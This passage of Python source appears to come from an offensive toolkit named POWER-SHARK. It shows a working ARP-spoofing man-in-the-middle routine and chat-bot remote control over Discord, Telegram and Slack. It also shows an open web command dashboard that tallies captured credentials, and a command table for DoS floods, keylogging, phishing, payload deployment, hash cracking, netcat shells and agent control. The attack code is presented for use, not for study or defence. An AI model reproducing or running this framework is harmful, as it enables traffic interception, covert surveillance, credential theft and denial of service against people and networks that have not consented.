        spoof_id = f"{target_ip}_{gateway_ip}_{int(time.time())}"
        stop_event = threading.Event()
        self.stop_events[spoof_id] = stop_event
        thread = threading.Thread(
            target=self._run_spoof,
            args=(spoof_id, target_ip, gateway_ip, interface or self.interface, stop_event),
            daemon=True
        )
        thread.start()
        self.active_spoofs[spoof_id] = {
            'target_ip': target_ip, 'gateway_ip': gateway_ip,
            'interface': interface or self.interface,
            'start_time': datetime.datetime.now().isoformat(),
            'status': 'running'
        }
        return ARPSpoofResult(
            target_ip=target_ip, gateway_ip=gateway_ip,
            interface=interface or self.interface, status="running",
            packets_sent=0, duration=0.0,
            started_at=datetime.datetime.now().isoformat(), ended_at=""
        )
    
    def _run_spoof(self, spoof_id: str, target_ip: str, gateway_ip: str,
                   interface: str, stop_event: threading.Event):
        try:
            target_mac = self._get_mac(target_ip, interface)
            gateway_mac = self._get_mac(gateway_ip, interface)
            if not target_mac or not gateway_mac:
                self._update_spoof_status(spoof_id, "failed", 0, 0)
                return
            packets_sent = 0
            start_time = time.time()
            while not stop_event.is_set():
                packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
                send(packet1, verbose=False)
                packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
                send(packet2, verbose=False)
                packets_sent += 2
                time.sleep(1)
            duration = time.time() - start_time
            self._update_spoof_status(spoof_id, "completed", packets_sent, duration)
        except Exception as e:
            logger.error(f"ARP spoofing error: {e}")
            self._update_spoof_status(spoof_id, "failed", 0, 0)
    
    def _get_mac(self, ip: str, interface: str) -> Optional[str]:
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            answered, _ = srp(broadcast / arp_request, timeout=2, iface=interface, verbose=False)
            if answered:
                return answered[0][1].hwsrc
            return None
        except:
            return None
    
    def _update_spoof_status(self, spoof_id: str, status: str, packets_sent: int, duration: float):
        if spoof_id in self.active_spoofs:
            spoof = self.active_spoofs[spoof_id]
            self.db.update_arp_spoof(spoof['target_ip'], spoof['gateway_ip'], packets_sent, duration)
            spoof['status'] = status
            if status in ('completed', 'failed'):
                if spoof_id in self.stop_events:
                    del self.stop_events[spoof_id]
                del self.active_spoofs[spoof_id]
    
    def _enable_ip_forward(self):
        try:
            if platform.system().lower() == 'linux':
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write('1')
        except:
            pass
    
    def stop_spoof(self, spoof_id: str = None) -> bool:
        if spoof_id:
            if spoof_id in self.stop_events:
                self.stop_events[spoof_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active_spoofs(self) -> List[Dict]:
        return [
            {
                'id': sid, 'target_ip': spoof['target_ip'],
                'gateway_ip': spoof['gateway_ip'], 'interface': spoof['interface'],
                'status': spoof['status'], 'start_time': spoof['start_time']
            }
            for sid, spoof in self.active_spoofs.items()
        ]
    
    def get_spoof_history(self, limit: int = 20) -> List[Dict]:
        return self.db.get_arp_spoofs(limit)

# =====================
# MAC MANAGER
# =====================
class MACManager:
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def get_mac_info(self, mac_address: str) -> Dict:
        mac = mac_address.upper().replace('-', ':').replace('.', ':')
        db_info = self.db.get_mac_info(mac)
        if db_info:
            return db_info
        vendor = NetworkTools.get_mac_vendor(mac)
        ip = self._get_ip_from_mac(mac)
        hostname = None
        if ip:
            try:
                hostname = socket.gethostbyaddr(ip)[0]
            except:
                pass
        self.db.add_mac_info(mac, vendor, ip, hostname)
        return {
            'mac_address': mac, 'vendor': vendor or 'Unknown',
            'ip_address': ip or 'Unknown', 'hostname': hostname or 'Unknown',
            'first_seen': datetime.datetime.now().isoformat(),
            'last_seen': datetime.datetime.now().isoformat()
        }
    
    def _get_ip_from_mac(self, mac: str) -> Optional[str]:
        try:
            if platform.system().lower() == 'linux':
                result = subprocess.run(['arp', '-n'], capture_output=True, text=True, timeout=5)
                for line in result.stdout.split('\n'):
                    if mac.lower() in line.lower():
                        parts = line.split()
                        if parts:
                            return parts[0]
            elif platform.system().lower() == 'windows':
                result = subprocess.run(['arp', '-a'], capture_output=True, text=True, timeout=5)
                for line in result.stdout.split('\n'):
                    if mac in line:
                        parts = line.split()
                        if parts:
                            return parts[0]
        except:
            pass
        return None
    
    def scan_network(self, network: str = None) -> List[Dict]:
        if not SCAPY_AVAILABLE:
            return []
        if not network:
            local_ip = NetworkTools.get_local_ip()
            network = f"{local_ip}/24"
        results = []
        try:
            arp = ARP(pdst=network)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            answered, _ = srp(ether / arp, timeout=2, verbose=False)
            for sent, received in answered:
                mac = received.hwsrc
                ip = received.psrc
                vendor = NetworkTools.get_mac_vendor(mac)
                self.db.add_mac_info(mac, vendor, ip, None)
                results.append({'mac_address': mac, 'ip_address': ip, 'vendor': vendor or 'Unknown'})
        except Exception as e:
            logger.error(f"Network scan error: {e}")
        return results

# =====================
# NAT INFO ENGINE
# =====================
class NATInfoEngine:
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def get_nat_info(self) -> NATInfo:
        public_ip = self._get_public_ip() or 'Unknown'
        private_ip = NetworkTools.get_local_ip()
        router_ip = self._get_router_ip() or 'Unknown'
        location = NetworkTools.location(public_ip) if public_ip != 'Unknown' else {}
        nat_info = NATInfo(
            public_ip=public_ip, private_ip=private_ip, router_ip=router_ip,
            country=location.get('country', 'Unknown'),
            isp=location.get('isp', 'Unknown'),
            nat_type=self._detect_nat_type(public_ip, private_ip)
        )
        self.db.add_nat_info(
            nat_info.public_ip, nat_info.private_ip, nat_info.router_ip,
            nat_info.country, nat_info.isp, nat_info.nat_type
        )
        return nat_info
    
    def _get_public_ip(self) -> Optional[str]:
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        try:
            response = requests.get('http://icanhazip.com', timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        return None
    
    def _get_router_ip(self) -> Optional[str]:
        try:
            if platform.system().lower() == 'linux':
                result = subprocess.run(['ip', 'route', 'show', 'default'],
                                       capture_output=True, text=True, timeout=5)
                for line in result.stdout.split('\n'):
                    if 'default' in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            return parts[2]
            elif platform.system().lower() == 'windows':
                result = subprocess.run(['ipconfig'], capture_output=True, text=True, timeout=5)
                for line in result.stdout.split('\n'):
                    if 'Default Gateway' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            return parts[1].strip()
        except:
            pass
        return None
    
    def _detect_nat_type(self, public_ip: str, private_ip: str) -> str:
        if public_ip and private_ip and public_ip != private_ip:
            return 'Full Cone NAT'
        elif public_ip and private_ip and public_ip == private_ip:
            return 'No NAT (Public IP)'
        return 'Unknown NAT Type'

# =====================
# PLATFORM BOTS
# =====================
class DiscordBot:
    def __init__(self, handler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.bot = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "discord_config.json")):
                with open(os.path.join(CONFIG_DIR, "discord_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'token': '', 'prefix': '!'}
    
    def save_config(self, token: str, enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'token': token, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "discord_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not DISCORD_AVAILABLE or not self.config.get('token'):
            return False
        intents = discord.Intents.default()
        intents.message_content = True
        self.bot = commands.Bot(command_prefix=self.config.get('prefix', '!'), intents=intents)
        
        @self.bot.event
        async def on_ready():
            print(f"{Colors.SUCCESS}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
            self.running = True
        
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return
            if message.content.startswith(self.config.get('prefix', '!')):
                cmd = message.content[len(self.config.get('prefix', '!')):].strip()
                result = self.handler.execute(cmd, 'discord', str(message.author.id))
                output = result.get('output', '')[:1900]
                embed = discord.Embed(title="🦈 POWER-SHARK Response",
                                     description=f"```{output}```", color=0xFFFFFF)
                await message.channel.send(embed=embed)
            await self.bot.process_commands(message)
        return True
    
    def start(self):
        if self.bot:
            threading.Thread(target=self._run, daemon=True).start()
    
    def _run(self):
        try:
            asyncio.run(self.bot.start(self.config['token']))
        except Exception as e:
            logger.error(f"Discord bot error: {e}")
    
    def send_message(self, text: str):
        pass
    
    def send_file(self, file_path: str):
        pass


class TelegramBot:
    def __init__(self, handler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "telegram_config.json")):
                with open(os.path.join(CONFIG_DIR, "telegram_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'bot_token': '', 'chat_id': '', 'prefix': '/'}
    
    def save_config(self, bot_token: str, chat_id: str = "", enabled: bool = True, prefix: str = '/') -> bool:
        try:
            config = {'enabled': enabled, 'bot_token': bot_token, 'chat_id': chat_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "telegram_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return TELETHON_AVAILABLE and bool(self.config.get('bot_token'))
    
    def start(self):
        if self.setup():
            threading.Thread(target=self._run, daemon=True).start()
    
    def _run(self):
        try:
            async def main():
                self.client = TelegramClient('power_shark_session', 1, 'dummy')
                await self.client.start(bot_token=self.config['bot_token'])
                print(f"{Colors.SUCCESS}✅ Telegram bot connected{Colors.RESET}")
                self.running = True
                
                @self.client.on(events.NewMessage)
                async def handler(event):
                    if event.message.text and event.message.text.startswith(self.config.get('prefix', '/')):
                        cmd = event.message.text[1:].strip()
                        result = self.handler.execute(cmd, 'telegram', str(event.sender_id))
                        output = result.get('output', '')[:4000]
                        await event.reply(f"```{output}```")
                await self.client.run_until_disconnected()
            asyncio.run(main())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")
    
    def send_message(self, text: str):
        pass
    
    def send_photo(self, photo_path: str):
        pass


class SlackBot:
    def __init__(self, handler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.client = None
        self.running = False
        self.config = self._load_config()
    
    def _load_config(self) -> Dict:
        try:
            if os.path.exists(os.path.join(CONFIG_DIR, "slack_config.json")):
                with open(os.path.join(CONFIG_DIR, "slack_config.json"), 'r') as f:
                    return json.load(f)
        except:
            pass
        return {'enabled': False, 'bot_token': '', 'channel_id': '', 'prefix': '!'}
    
    def save_config(self, bot_token: str, channel_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
        try:
            config = {'enabled': enabled, 'bot_token': bot_token, 'channel_id': channel_id, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "slack_config.json"), 'w') as f:
                json.dump(config, f, indent=4)
            self.config = config
            return True
        except:
            return False
    
    def setup(self) -> bool:
        if not SLACK_AVAILABLE or not self.config.get('bot_token'):
            return False
        self.client = WebClient(token=self.config['bot_token'])
        return True
    
    def start(self):
        if self.client:
            threading.Thread(target=self._monitor, daemon=True).start()
            self.running = True
    
    def _monitor(self):
        channel = self.config.get('channel_id', 'general')
        while self.running:
            try:
                response = self.client.conversations_history(channel=channel, limit=5)
                if response['ok'] and response['messages']:
                    for msg in response['messages']:
                        if msg.get('text', '').startswith(self.config.get('prefix', '!')):
                            cmd = msg['text'][len(self.config.get('prefix', '!')):].strip()
                            result = self.handler.execute(cmd, 'slack', msg.get('user', 'unknown'))
                            self.client.chat_postMessage(channel=channel, text=f"```{result.get('output', '')[:2000]}```")
                time.sleep(5)
            except Exception as e:
                logger.error(f"Slack monitor error: {e}")
                time.sleep(10)
    
    def send_message(self, text: str):
        pass


class SignalBot:
    def __init__(self, handler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = {'enabled': False, 'phone_number': '', 'prefix': '!'}
    
    def save_config(self, phone_number: str, enabled: bool = True, prefix: str = '!') -> bool:
        try:
            self.config = {'enabled': enabled, 'phone_number': phone_number, 'prefix': prefix}
            with open(os.path.join(CONFIG_DIR, "signal_config.json"), 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return SIGNAL_AVAILABLE and bool(self.config.get('phone_number'))
    
    def start(self):
        if self.setup():
            self.running = True
            print(f"{Colors.SUCCESS}✅ Signal bot configured{Colors.RESET}")
    
    def send_message(self, text: str):
        pass


class GoogleChatBot:
    def __init__(self, handler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.running = False
        self.config = {'enabled': False, 'webhook_url': ''}
    
    def save_config(self, webhook_url: str, enabled: bool = True) -> bool:
        try:
            self.config = {'enabled': enabled, 'webhook_url': webhook_url}
            with open(os.path.join(CONFIG_DIR, "googlechat_config.json"), 'w') as f:
                json.dump(self.config, f, indent=4)
            return True
        except:
            return False
    
    def setup(self) -> bool:
        return bool(self.config.get('webhook_url'))
    
    def start(self):
        if self.setup():
            self.running = True
    
    def send_message(self, text: str) -> bool:
        try:
            webhook_url = self.config.get('webhook_url', '')
            if not webhook_url:
                return False
            response = requests.post(webhook_url, json={'text': text[:4000]},
                                    headers={'Content-Type': 'application/json'}, timeout=10)
            return response.status_code == 200
        except:
            return False


# =====================
# WEB DASHBOARD
# =====================
class WebDashboard:
    def __init__(self, handler, db: DatabaseManager, config: ConfigManager):
        self.handler = handler
        self.db = db
        self.config = config
        self.app = None
        self.socketio = None
        self.running = False
    
    def create_app(self):
        if not WEB_AVAILABLE:
            return None
        app = Flask(__name__)
        app.config['SECRET_KEY'] = self.config.get('web.secret_key', secrets.token_hex(32))
        CORS(app)
        socketio = SocketIO(app, cors_allowed_origins="*")
        
        TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>POWER-SHARK · cyber command</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
  background: #000; color: #fff;
  font-family: 'Fira Code', 'Courier New', monospace;
  min-height: 100vh; display: flex; align-items: center;
  justify-content: center; padding: 1.5rem;
}
body::before {
  content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
  background-image: linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
                    linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
  background-size: 40px 40px; pointer-events: none; z-index: 0;
  animation: shift 24s linear infinite;
}
@keyframes shift { 0% { background-position: 0 0; } 100% { background-position: 40px 40px; } }
.hacker-app {
  width: 100%; max-width: 1100px; background: rgba(0,0,0,0.85);
  border: 2px solid #fff; box-shadow: 0 0 30px rgba(255,255,255,0.3);
  padding: 2rem 1.8rem 1.8rem; position: relative; z-index: 5;
  animation: borderPulse 4s infinite alternate;
}
@keyframes borderPulse {
  0% { box-shadow: 0 0 15px rgba(255,255,255,0.2); }
  100% { box-shadow: 0 0 40px rgba(255,255,255,0.5); }
}
.header {
  display: flex; align-items: baseline; justify-content: space-between;
  margin-bottom: 2rem; border-bottom: 2px solid #fff; padding-bottom: 0.75rem;
}
.logo {
  font-size: 2.4rem; font-weight: 800; text-transform: uppercase;
  color: #fff; text-shadow: 0 0 8px #fff;
}
.badge {
  font-size: 0.9rem; border: 1px solid #fff; padding: 0.25rem 1rem;
  border-radius: 20px; letter-spacing: 2px; text-transform: uppercase;
}
.status-bar {
  display: flex; justify-content: space-between; align-items: center;
  margin-top: 1.2rem; font-size: 0.75rem; text-transform: uppercase;
  letter-spacing: 1.5px; color: #aaa; border-top: 1px solid #333; padding-top: 1rem;
}
.led {
  width: 8px; height: 8px; background: #fff; border-radius: 50%;
  box-shadow: 0 0 10px #fff; animation: pulse 1.8s infinite; display: inline-block;
  margin-right: 0.5rem;
}
@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
.command-zone { display: flex; flex-direction: column; gap: 1.5rem; margin-bottom: 2rem; }
.input-group {
  display: flex; align-items: center; background: #000; border: 2px solid #fff;
  padding: 0.2rem 0.2rem 0.2rem 1rem;
}
.input-group:focus-within { box-shadow: 0 0 25px #fff; transform: scale(1.01); }
.prompt { color: #fff; font-weight: bold; font-size: 1.3rem; margin-right: 0.8rem; }
#commandInput {
  flex: 1; background: transparent; border: none; outline: none;
  color: #fff; font-family: inherit; font-size: 1.2rem; padding: 1rem 0.2rem;
  caret-color: #fff;
}
#commandInput::placeholder { color: #888; font-style: italic; font-size: 1rem; }
.execute-btn {
  background: #fff; color: #000; border: none; font-weight: 800;
  font-size: 1.1rem; padding: 1rem 2rem; cursor: pointer;
  text-transform: uppercase; letter-spacing: 2px; font-family: inherit;
}
.execute-btn:hover { background: #000; color: #fff; box-shadow: 0 0 20px #fff; }
.quick-commands {
  display: flex; flex-wrap: wrap; gap: 0.8rem; margin-bottom: 1rem; align-items: center;
}
.quick-label {
  font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px;
  border: 1px solid #555; padding: 0.3rem 0.8rem; border-radius: 20px; color: #ccc;
}
.chip {
  background: transparent; border: 1px solid #fff; color: #fff;
  padding: 0.5rem 1.1rem; border-radius: 30px; font-size: 0.9rem;
  cursor: pointer; font-family: inherit; text-transform: lowercase;
}
.chip:hover {
  background: #fff; color: #000; box-shadow: 0 0 18px #fff;
  transform: translateY(-2px);
}
.output-window {
  background: #000; border: 2px solid #fff; padding: 1.5rem;
  min-height: 300px; max-height: 400px; overflow-y: auto;
  font-size: 1rem; line-height: 1.6; color: #e0e0e0;
  box-shadow: inset 0 0 25px rgba(255,255,255,0.05);
}
.output-line { display: flex; gap: 0.8rem; margin-bottom: 0.5rem; word-break: break-word; }
.output-prompt { color: #fff; font-weight: bold; }
.output-text.success { color: #fff; font-weight: bold; text-shadow: 0 0 8px #fff; }
.output-text.error { color: #aaa; }
.output-text.info { color: #ccc; font-style: italic; }
.blinking-cursor {
  display: inline-block; width: 10px; height: 1.2rem; background: #fff;
  vertical-align: middle; margin-left: 5px; animation: blink 1s step-end infinite;
}
@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
@media (max-width: 700px) {
  .logo { font-size: 1.6rem; }
  .execute-btn { padding: 1rem 1rem; font-size: 0.9rem; }
  .chip { padding: 0.4rem 0.9rem; font-size: 0.8rem; }
}
</style>
</head>
<body>
<div class="hacker-app">
  <div class="header">
    <div class="logo">🦈 POWER-SHARK</div>
    <div class="badge">v1.0 · root</div>
  </div>
  <div class="command-zone">
    <div class="input-group">
      <span class="prompt">$</span>
      <input type="text" id="commandInput" placeholder="enter command (e.g., help, nmap_quick 127.0.0.1, status)" autofocus>
      <button class="execute-btn" id="executeBtn">▶ run</button>
    </div>
    <div class="quick-commands">
      <span class="quick-label">quick</span>
      <button class="chip" data-cmd="help">help</button>
      <button class="chip" data-cmd="status">status</button>
      <button class="chip" data-cmd="system">system</button>
      <button class="chip" data-cmd="threats">threats</button>
      <button class="chip" data-cmd="ping 127.0.0.1">ping</button>
      <button class="chip" data-cmd="nmap_quick 127.0.0.1">nmap</button>
      <button class="chip" data-cmd="nat_info">nat_info</button>
      <button class="chip" data-cmd="arp_status">arp_status</button>
      <button class="chip" data-cmd="crack_list">crack_list</button>
    </div>
    <div class="quick-commands">
      <span class="quick-label">recon</span>
      <button class="chip" data-cmd="traceroute 127.0.0.1">traceroute</button>
      <button class="chip" data-cmd="whois google.com">whois</button>
      <button class="chip" data-cmd="dns google.com">dns</button>
      <button class="chip" data-cmd="location 127.0.0.1">location</button>
      <button class="chip" data-cmd="netmon_status">netmon</button>
      <button class="chip" data-cmd="traffic_types">traffic</button>
      <button class="chip" data-cmd="docker_ps">docker</button>
      <button class="chip" data-cmd="keylogger_status">keylog</button>
      <button class="chip" data-cmd="monitor_status">monitor</button>
    </div>
  </div>
  <div class="output-window" id="outputWindow">
    <div class="output-line">
      <span class="output-prompt">></span>
      <span class="output-text info">POWER-SHARK terminal ready. type a command or use chips.</span>
    </div>
    <div class="output-line">
      <span class="output-prompt">></span>
      <span class="output-text">┌─[ black & white cyber ops ]─┐</span>
    </div>
    <div class="output-line">
      <span class="output-prompt">></span>
      <span class="output-text">└──► awaiting input<span class="blinking-cursor"></span></span>
    </div>
  </div>
  <div class="status-bar">
    <div class="status-item"><span class="led"></span>connected · tty1</div>
    <div class="status-item"><span id="statsDisplay">loading stats...</span></div>
  </div>
</div>
<script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
<script>
(function() {
  const socket = io();
  const input = document.getElementById('commandInput');
  const executeBtn = document.getElementById('executeBtn');
  const outputWindow = document.getElementById('outputWindow');
  const chips = document.querySelectorAll('.chip');
  const statsDisplay = document.getElementById('statsDisplay');

  function appendOutput(command, response, type) {
    type = type || 'info';
    const line = document.createElement('div');
    line.className = 'output-line';
    const promptSpan = document.createElement('span');
    promptSpan.className = 'output-prompt';
    promptSpan.textContent = '$';
    const textSpan = document.createElement('span');
    textSpan.className = 'output-text ' + type;
    textSpan.textContent = command || response;
    line.appendChild(promptSpan);
    line.appendChild(textSpan);
    outputWindow.appendChild(line);
    outputWindow.scrollTop = outputWindow.scrollHeight;
    if (outputWindow.children.length > 100) {
      outputWindow.removeChild(outputWindow.children[0]);
    }
  }

  function appendMultiline(output, type) {
    type = type || 'info';
    const lines = output.split('\\n');
    lines.forEach(function(line) {
      const div = document.createElement('div');
      div.className = 'output-text ' + type;
      div.textContent = line || ' ';
      div.style.marginLeft = '1.5rem';
      outputWindow.appendChild(div);
    });
    outputWindow.scrollTop = outputWindow.scrollHeight;
  }

  function executeCommand(cmd) {
    const trimmed = cmd.trim();
    if (!trimmed) { appendOutput('', 'please enter a command.', 'error'); return; }
    appendOutput(trimmed, '', 'info');
    fetch('/api/command', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ command: trimmed })
    })
    .then(function(response) { return response.json(); })
    .then(function(data) {
      if (data.success) {
        appendMultiline(data.output || '(no output)', 'success');
      } else {
        appendMultiline(data.output || 'Command failed', 'error');
      }
      updateStats();
    })
    .catch(function(err) {
      appendOutput('', 'connection error: ' + err, 'error');
    });
  }

  function updateStats() {
    fetch('/api/stats')
      .then(function(response) { return response.json(); })
      .then(function(data) {
        statsDisplay.textContent = 'cmds:' + (data.total_commands||0) +
          ' threats:' + (data.total_threats||0) +
          ' ips:' + (data.total_managed_ips||0) +
          ' creds:' + (data.captured_credentials||0);
      })
      .catch(function() {});
  }

  executeBtn.addEventListener('click', function() {
    executeCommand(input.value);
    input.value = '';
    input.focus();
  });

  input.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
      e.preventDefault();
      executeCommand(input.value);
      input.value = '';
    }
  });

  chips.forEach(function(chip) {
    chip.addEventListener('click', function() {
      const cmd = this.getAttribute('data-cmd');
      if (cmd) {
        input.value = cmd;
        executeCommand(cmd);
        input.value = '';
        input.focus();
      }
    });
  });

  window.addEventListener('load', function() {
    updateStats();
    setInterval(updateStats, 15000);
    input.focus();
  });
})();
</script>
</body>
</html>'''
        
        @app.route('/')
        def index():
            return render_template_string(TEMPLATE)
        
        @app.route('/api/command', methods=['POST'])
        def api_command():
            data = request.json
            command = data.get('command', '')
            result = self.handler.execute(command, 'web', 'web_user')
            socketio.emit('command_result', {
                'command': command,
                'output': result.get('output', '')[:2000],
                'execution_time': result.get('execution_time', 0)
            })
            return jsonify(result)
        
        @app.route('/api/stats')
        def api_stats():
            stats = self.db.get_statistics()
            return jsonify(stats)
        
        @app.route('/api/threats')
        def api_threats():
            threats = self.db.get_recent_threats(20)
            return jsonify({'threats': threats})
        
        self.app = app
        self.socketio = socketio
        return app
    
    def start(self):
        if not WEB_AVAILABLE:
            print(f"{Colors.WARNING}⚠️ Flask not available. Web dashboard disabled.{Colors.RESET}")
            return
        app = self.create_app()
        if app:
            port = self.config.get('web.port', 5000)
            host = self.config.get('web.host', '0.0.0.0')
            thread = threading.Thread(
                target=lambda: self.socketio.run(app, host=host, port=port, debug=False),
                daemon=True
            )
            thread.start()
            self.running = True
            print(f"{Colors.SUCCESS}✅ Web dashboard running at http://{host}:{port}{Colors.RESET}")

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    def __init__(self, db, ssh_manager=None, traffic_gen=None, nikto=None,
                 dos_engine=None, agent_engine=None, network_monitor=None,
                 keylogger=None, deployment_engine=None, domain_hosting=None,
                 cracking_engine=None, arp_spoofing=None, mac_manager=None,
                 nat_info=None, email_composer=None, pdf_report=None,
                 docker_scanner=None):
        self.db = db
        self.ssh = ssh_manager
        self.traffic = traffic_gen
        self.nikto = nikto
        self.dos = dos_engine
        self.agent = agent_engine
        self.network_monitor = network_monitor
        self.keylogger = keylogger
        self.deployment = deployment_engine
        self.domain_hosting = domain_hosting
        self.cracking = cracking_engine
        self.arp_spoofing = arp_spoofing
        self.mac_manager = mac_manager
        self.nat_info = nat_info
        self.email_composer = email_composer
        self.pdf_report = pdf_report
        self.docker_scanner = docker_scanner
        self.social = SocialEngineeringTools(db)
        self.tools = NetworkTools()
        self.commands = self._build_commands()
    
    def _build_commands(self) -> Dict[str, Callable]:
        commands = {
            # Ping
            'ping': self._ping, 'ping6': self._ping6, 'ping_sweep': self._ping_sweep,
            'fping': self._fping, 'ping_count': self._ping_count,
            'ping_flood': self._ping_flood, 'ping_timeout': self._ping_timeout,
            'ping_size': self._ping_size, 'ping_interval': self._ping_interval,
            # Nmap
            'nmap': self._nmap, 'nmap_quick': self._nmap_quick, 'nmap_full': self._nmap_full,
            'nmap_os': self._nmap_os, 'nmap_service': self._nmap_service,
            'nmap_udp': self._nmap_udp, 'nmap_vuln': self._nmap_vuln,
            'nmap_stealth': self._nmap_stealth, 'nmap_ping': self._nmap_ping,
            'nmap_traceroute': self._nmap_traceroute, 'nmap_script': self._nmap_script,
            'nmap_aggressive': self._nmap_aggressive,
            # Traceroute
            'traceroute': self._traceroute, 'tracert': self._traceroute,
            'tracepath': self._tracepath, 'mtr': self._mtr,
            'tcptraceroute': self._tcptraceroute, 'traceroute_udp': self._traceroute_udp,
            'traceroute_icmp': self._traceroute_icmp,
            # Wget
            'wget': self._wget, 'wget_file': self._wget_file,
            'wget_recursive': self._wget_recursive, 'wget_mirror': self._wget_mirror,
            'wget_continue': self._wget_continue, 'wget_limit': self._wget_limit,
            'wget_user_agent': self._wget_user_agent, 'wget_header': self._wget_header,
            'wget_post': self._wget_post, 'wget_auth': self._wget_auth,
            # Curl
            'curl': self._curl, 'curl_get': self._curl_get, 'curl_post': self._curl_post,
            'curl_head': self._curl_head, 'curl_options': self._curl_options,
            'curl_put': self._curl_put, 'curl_delete': self._curl_delete,
            'curl_patch': self._curl_patch, 'curl_auth': self._curl_auth,
            'curl_cookie': self._curl_cookie, 'curl_follow': self._curl_follow,
            'curl_verbose': self._curl_verbose,
            # Netcat
            'nc': self._netcat, 'netcat': self._netcat, 'nc_listen': self._nc_listen,
            'nc_scan': self._nc_scan, 'nc_chat': self._nc_chat,
            'nc_transfer': self._nc_transfer, 'nc_shell': self._nc_shell,
            # SSH
            'ssh_add': self._ssh_add, 'ssh_list': self._ssh_list,
            'ssh_connect': self._ssh_connect, 'ssh_exec': self._ssh_exec,
            'ssh_disconnect': self._ssh_disconnect,
            # Traffic
            'traffic': self._traffic, 'traffic_types': self._traffic_types,
            'traffic_stop': self._traffic_stop, 'traffic_status': self._traffic_status,
            'traffic_icmp': self._traffic_icmp, 'traffic_tcp': self._traffic_tcp,
            'traffic_udp': self._traffic_udp, 'traffic_http': self._traffic_http,
            'traffic_dns': self._traffic_dns, 'traffic_arp': self._traffic_arp,
            'traffic_mixed': self._traffic_mixed,
            # Nikto
            'nikto': self._nikto, 'nikto_full': self._nikto_full,
            'nikto_ssl': self._nikto_ssl, 'nikto_port': self._nikto_port,
            'nikto_tuning': self._nikto_tuning,
            # DOS
            'dos_syn': self._dos_syn, 'dos_udp': self._dos_udp,
            'dos_http': self._dos_http, 'dos_icmp': self._dos_icmp,
            'dos_stop': self._dos_stop, 'dos_status': self._dos_status,
            # Agent
            'agent_register': self._agent_register, 'agent_command': self._agent_command,
            'agent_list': self._agent_list, 'agent_status': self._agent_status,
            # Network monitor
            'netmon_start': self._netmon_start, 'netmon_stop': self._netmon_stop,
            'netmon_status': self._netmon_status, 'netmon_packets': self._netmon_packets,
            'netmon_stats': self._netmon_stats,
            # Keylogger
            'keylogger_start': self._keylogger_start, 'keylogger_stop': self._keylogger_stop,
            'keylogger_status': self._keylogger_status, 'keylogger_logs': self._keylogger_logs,
            'keylogger_screenshots': self._keylogger_screenshots,
            'keylogger_clipboard': self._keylogger_clipboard,
            # Deployment
            'deploy_pdf': self._deploy_pdf, 'deploy_email': self._deploy_email,
            'deploy_link': self._deploy_link, 'deploy_executable': self._deploy_executable,
            'deploy_list': self._deploy_list, 'deploy_track': self._deploy_track,
            # Domain hosting
            'ip_to_domain': self._ip_to_domain, 'domain_to_ip': self._domain_to_ip,
            'host_domain': self._host_domain, 'list_domains': self._list_domains,
            # Social engineering
            'phish_start': self._phish_start, 'phish_stop': self._phish_stop,
            'phish_creds': self._phish_creds,
            # Cracking
            'crack': self._crack, 'crack_status': self._crack_status,
            'crack_list': self._crack_list, 'crack_md5': self._crack_md5,
            'crack_sha1': self._crack_sha1, 'crack_sha256': self._crack_sha256,
            'crack_ntlm': self._crack_ntlm,
            # ARP
            'arp_spoof': self._arp_spoof, 'arp_stop': self._arp_stop,
